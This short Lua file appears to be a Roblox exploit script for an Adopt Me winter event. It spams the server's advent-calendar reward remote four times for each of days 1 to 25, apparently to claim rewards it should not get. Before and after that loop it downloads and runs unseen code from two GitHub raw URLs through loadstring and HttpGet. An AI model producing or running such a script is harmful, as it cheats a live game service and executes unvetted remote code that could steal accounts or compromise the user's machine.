loadstring(game:HttpGet(('https://raw.githubusercontent.com/Spinzox/main/refs/heads/main/script.lua'),true))()
wait(1)


wait(2)  -- Initial wait time

for i = 1, 25 do
    -- Execute the same number four times rapidly
    for j = 1, 4 do
        local args = {i}  
        game:GetService("ReplicatedStorage").API:FindFirstChild("WinterfestAPI/AdventCalendarTryTakeReward"):InvokeServer(unpack(args))
    end
    wait(0.5)  -- Wait for 0.5 seconds before moving on to the next number
end
wait(1)
loadstring(game:HttpGet(('https://raw.githubusercontent.com/greg66n/adopt/refs/heads/main/adopt1.lua'),true))()
